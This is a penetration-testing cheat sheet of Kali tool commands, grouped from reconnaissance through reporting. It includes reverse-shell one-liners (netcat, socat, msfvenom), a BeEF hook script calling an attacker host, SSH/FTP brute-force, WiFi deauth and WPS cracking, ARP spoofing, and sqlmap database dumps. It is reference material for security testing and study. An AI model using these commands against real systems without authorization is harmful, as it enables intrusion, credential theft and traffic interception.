### 01 - Information Gathering

##### [[DNSenum]]
  - `dnsenum <domain>` → basic DNS info (NS, MX, SOA, subdomains)
  - `dnsenum -f <wordlist> <domain>` → brute-force subdomains with a wordlist
  - `dnsenum --dnsserver <dns> <domain>` → query using a specific DNS server
  - `dnsenum -o <prefix> <domain>` → save results with file prefix

##### [[Gobuster]]
  - `gobuster dir -u <url> -w <wordlist>` → find hidden web directories
  - `gobuster dir -u <url> -w <wordlist> -x .php,.txt` → try common extensions
  - `gobuster dns -d <domain> -w <wordlist>` → brute-force subdomains
  - `gobuster vhost -u <url> -w <wordlist>` → brute-force virtual hosts

##### [[Nmap]]
  - `nmap -T4 -F <target>` → quick scan (common ports)
  - `sudo nmap -sS -sV -sC -O -p- <target>` → full scan (version, scripts, OS)
  - `sudo nmap -sU -p <ports> <target>` → UDP scan of chosen ports
  - `nmap -oA <prefix> <target>` → save results in all formats

##### [[Recon-ng]]
  - `recon-ng` → start the framework
  - `workspaces create <name>` → create a workspace for your target
  - `modules load <module>` → load a recon module
  - `options set SOURCE <domain>` → set the target for the module
  - `run` → execute the module
  - `show hosts` → list discovered hosts
  - `export csv <file>` → export results

##### [[WhatWeb]]
  - `whatweb <url>` → quick fingerprint of site tech
  - `whatweb -a 3 <url>` → more aggressive detection
  - `whatweb -v <url> -o <file>` → verbose output and save to file

##### [[WHOIS]]
  - `whois <domain>` → domain registration info
  - `whois <ip>` → IP ownership/allocation info

### 02 - Vulnerability Analysis

##### [[Lynis]]
  - `sudo lynis audit system` → run a full system security audit
  - `lynis show tests` → list available test categories
  - `sudo lynis update info` → update lynis data/plugins

##### [[Nikto]]
  - `nikto -h http://<target>` → basic webserver scan for common issues
  - `nikto -h https://<target> -o nikto.xml -Format xml` → save XML report
  - `nikto -h <target> -Tuning 2` → limit tuning category to reduce checks

##### [[OpenVas]]
  - `sudo systemctl status gvm` → check GVM/OpenVAS service status
  - `sudo gvm-feed-update` → update vulnerability feeds (may vary by install)
  - (Use the web UI at https://localhost:9392) → create target, create task, run scan

##### [[WPScan]]
  - `wpscan --url http://<target> --enumerate u` → enumerate users
  - `wpscan --url https://<target> --enumerate p,t --api-token <token>` → enumerate plugins & themes with API token
  - `wpscan --url <target> -o wpscan-report.txt` → save report to file

### 03 - Web Exploitation

##### [[Burp Suite]]
  - `burpsuite` → launch Burp GUI and configure browser proxy (127.0.0.1:8080)
  - Use **Proxy** → intercept requests, send to **Repeater** to modify and resend
  - Use **Intruder** → automate payloads/fuzzing (Pro has extra features)

##### [[Commix]]
  - `commix -u "http://<target>/vuln.php?cmd=test"` → test for command injection
  - `commix -u "<url>" --os-cmd="id"` → run a single OS command
  - `commix --proxy=http://127.0.0.1:8080` → route through Burp for inspection

##### [[SQLmap]]
  - `sqlmap -u "http://<target>/page.php?id=1" --batch` → basic automated SQLi test
  - `sqlmap -r request.txt --dbs` → use Burp request file to enumerate DBs
  - `sqlmap -u "<url>" --dump -D <db> -T <table>` → dump table data

##### [[ZAProxy]]
  - `owasp-zap` → launch ZAP GUI and configure browser proxy (127.0.0.1:8080)
  - `zap.sh -daemon -port 8080` → start ZAP in headless mode (use API)
  - Use **Active Scanner** → run automated active tests (authorized targets only)

### 04 - Password Attacks

##### [[Cewl]]
  - `cewl <url> -w <file>` → crawl site and save wordlist
  - `cewl -d 2 -m 5 -c <url> -w <file>` → depth 2, min length 5, count & save

##### [[Hashcat]]
  - `hashcat -m <mode> -a 0 hashes.txt rockyou.txt -o cracked.txt` → dictionary attack
  - `hashcat -m <mode> -a 3 hashes.txt ?l?l?l?l?l?l` → brute-force mask
  - `hashcat -m <mode> -a 6 hashes.txt rockyou.txt ?d?d` → hybrid (wordlist + mask)

##### [[Hydra]]
  - `hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<host> -t 4 -f` → SSH brute-force for single user
  - `hydra -L users.txt -P passwords.txt ftp://<host> -t 6` → FTP with userlist & passlist
  - `hydra -l admin -P passwords.txt <host> http-form-post "/login.php:username=^USER^&password=^PASS^:F=incorrect"` → HTTP form example

##### [[John]]
  - `john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt` → wordlist attack
  - `john --show hashes.txt` → display cracked passwords
  - `john --incremental hashes.txt` → incremental brute-force

##### [[Medusa]]
  - `medusa -h <host> -U users.txt -P passwords.txt -M ssh -t 8 -f` → SSH brute-force
  - `medusa -h <host> -U users.txt -P passwords.txt -M ftp` → FTP brute-force

### 05 - Wireless Attacks

##### [[Aircrack-ng]]
  - `airmon-ng check kill` → stop interfering services before monitor mode
  - `airmon-ng start <iface>` → enable monitor mode (creates mon0 or wlan0mon)
  - `airodump-ng --bssid <BSSID> -c <channel> -w <prefix> <mon_iface>` → capture packets/handshake
  - `aireplay-ng --deauth 10 -a <BSSID> -c <client> <mon_iface>` → deauth client to force handshake
  - `aircrack-ng -w <wordlist> -b <BSSID> <capture>.cap` → crack handshake with wordlist

##### [[Kismet]]
  - `sudo kismet` → launch Kismet server and web UI (http://127.0.0.1:2501)
  - `sudo kismet -c wifi:mon0:name=mon0` → start with specific source
  - Export pcaps via UI or kismet.conf for later analysis

##### [[Reaver]]
  - `sudo reaver -i mon0 -b <BSSID> -c <channel> -vv` → brute-force WPS PIN
  - `sudo reaver -i mon0 -b <BSSID> -c <channel> -K 1 -vv` → try pixie-dust attack (if supported)
  - `--mac=<mac>` → spoof MAC to avoid rate-limits or blocks

##### [[Wifite]]
  - `sudo wifite` → interactive scan and attack menu for nearby APs
  - `sudo wifite --kill --wps --crack --dict /path/to/rockyou.txt -i mon0` → non-interactive WPS + handshake capture + cracking
  - `--kill` → stops NetworkManager/wpa_supplicant while running

### 06 - Reverse Engineering

##### [[Edb-debugger]]
  - `edb ./binary` → open binary in Edb GUI for visual debugging
  - `edb -p <pid>` → attach to running process
  - Use breakpoints (click) and step (F7/F8) to inspect registers/memory

##### [[Gdb]]
  - `gdb ./binary` → start gdb with binary
  - `gdb -p <pid>` → attach to running process
  - `break main` / `run <args>` / `info registers` / `x/32xb $rsp` → common workflow

##### [[Jadx]]
  - `jadx-gui app.apk` → open APK in GUI and browse decompiled Java
  - `jadx -d out app.apk` → decompile APK to folder `out/`
  - `grep -R "KEY" out/` → search decompiled sources for strings

##### [[Radare2]]
  - `r2 -A ./binary` → open and auto-analyze binary
  - `afl` → list functions
  - `pdf @ sym.main` → print disassembly of `main`
  - `VV` → visual mode (interactive disassembly)

### 07 - Exploitation Tools

##### [[Beef-xss]]
  - `beef-xss` → start BeEF UI (http://127.0.0.1:3000/ui/panel)
  - Hook with `<script src="http://<attacker>:3000/hook.js"></script>` → inject into vulnerable page

##### [[Metasploit]]
  - `msfconsole` → start Metasploit console
  - `search <keyword>` → find module
  - `use exploit/...` / `set RHOSTS <ip>` / `exploit` → run exploit

##### [[Msfvenom]]
  - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o shell.exe` → Windows reverse shell exe
  - `msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf -o shell.elf` → Linux reverse shell ELF
  - `msfvenom -p ... -f c` → output C-style shellcode

##### [[Searchsploit]]
  - `searchsploit <keyword>` → search Exploit-DB offline
  - `searchsploit -m <id>` → copy exploit to current directory
  - `searchsploit -x <id>` → open exploit in editor

### 08 - Sniffing & Spoofing

##### [[Bettercap]]
  - `bettercap -iface <iface>` → start Bettercap on an interface
  - `net.probe on` / `net.recon on` → discover hosts
  - `arp.spoof on` / `net.sniff on` → perform ARP MITM and sniff traffic

##### [[Ettercap]]
  - `ettercap -T -M arp:remote /<target1>/ /<target2>/` → ARP MITM between two hosts
  - `ettercap -G` → launch GUI mode
  - Use plugins like `dns_spoof` for DNS hijacking

##### [[TCPdump]]
  - `tcpdump -i eth0 -nn -c 10` → capture 10 packets
  - `tcpdump -i eth0 port 80 -A` → capture and show HTTP traffic
  - `tcpdump -i wlan0 -w capture.pcap` → save to file for Wireshark

##### [[Wireshark]]
  - `wireshark` → launch GUI analyzer
  - Display filters: `http`, `ip.addr == <ip>`, `tcp.port == 21`
  - Right-click packet → Follow TCP Stream → reconstruct conversation

### 09 - Maintaining Access

##### [[Netcat]]
  - `nc -lvnp 4444` → listener on port 4444
  - `nc <ip> 4444 -e /bin/bash` → reverse shell to listener
  - `nc -l -p 1234 < file.txt` / `nc <ip> 1234 > file.txt` → file transfer
##### [[Socat]]
  - `socat tcp-connect:<ip>:<port> exec:/bin/bash,pty,stderr,sigint,setsid,sane` → reverse shell
  - Listener: `socat file:\`tty\`,raw,echo=0 tcp-listen:4444`  
    Victim: `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<ip>:4444` → stable shell upgrade
  - `socat tcp-listen:8080,reuseaddr,fork tcp:<target>:80` → port forward

##### [[SSH]]
  - `ssh user@<ip>` → basic login
  - `ssh -i id_rsa user@<ip>` → login with private key
  - `ssh -L 8080:localhost:3306 user@<ip>` → local port forward
  - `ssh -D 1080 user@<ip>` → dynamic SOCKS proxy

### 10 - Digital Forensics

##### [[Autopsy]]
  - `autopsy` → launch Autopsy server and open browser UI (http://127.0.0.1:9999)
  - Create case -> Add data source (image.dd) -> run ingest modules (timeline, keyword, file type)
  - Export HTML/PDF report from GUI

##### [[Binwalk]]
  - `binwalk firmware.bin` → scan for embedded files and signatures
  - `binwalk -e firmware.bin` → auto-extract embedded files to _firmware.bin.extracted/
  - `grep -R "flag{" _firmware.bin.extracted/` → search extracted content for flags

##### [[Sleuthkit]]
  - `mmls image.dd` → show partition layout and offsets
  - `fls -r -m / image.dd` → list files (including deleted)
  - `icat image.dd <inode> > recovered_file` → extract file by inode
  - `tsk_recover image.dd output_dir/` → recover many files

##### [[Volatility]]
  - `vol.py -f memory.dmp --profile=<profile> pslist` → (Vol2) list processes
  - `vol -f memory.raw linux.pslist` → (Vol3) list processes
  - `vol -f memory.raw linux.lsof` / `netscan` → list connections and open files
  - `strings memory.raw | grep -i password` → quick memory string search

### 11 - Reporting

##### [[Dradis]]
  - `docker run --rm -p 3000:3000 dradis/dradis-ce` → quick Dradis server (Docker)
  - Use web UI to create project, import Nmap/Nessus/Burp outputs, add findings, export HTML/PDF

##### [[Faraday]]
  - `docker-compose up -d` → start Faraday server/client stack (depends on your compose file)
  - `faraday-import nmap -f nmap.xml -w myworkspace` → import Nmap into workspace (CLI helper name may vary)
  - Use web UI to tag findings, add notes, and export reports

##### [[Maltego]]
  - Launch GUI -> New Graph -> add seed entities (domain/email/IP) -> run transforms
  - Add API keys (Shodan, VirusTotal) in settings to enable advanced transforms
  - Export graph -> PNG/CSV for reporting

### 12 - Other

##### [[Exiftool]]
  - `exiftool <file>` → show metadata for images/docs
  - `exiftool -a -u -g1 <file>` → show all tags including unknown/custom tags
  - `exiftool -csv -all <file>` → export metadata as CSV

##### [[Steghide]]
  - `steghide info <file>` → check if file contains embedded data
  - `steghide extract -sf <file> -xf <out>` → extract embedded file (prompts for passphrase)
  - `steghide embed -cf <cover> -ef <secret> -sf <out>` → embed secret into cover (prompts for passphrase)

##### [[Stegseek]]
  - `stegseek <stego-file> <wordlist> <output>` → brute-force stego passphrase with wordlist
  - Use targeted wordlists (Cewl output or rockyou) for better success

##### [[Strings]]
  - `strings <file>` → print printable strings (min length 4)
  - `strings -n 6 <file>` → set min length to 6 to reduce noise
  - `strings -t x <file> | grep -i password` → show hex offsets and search for "password"
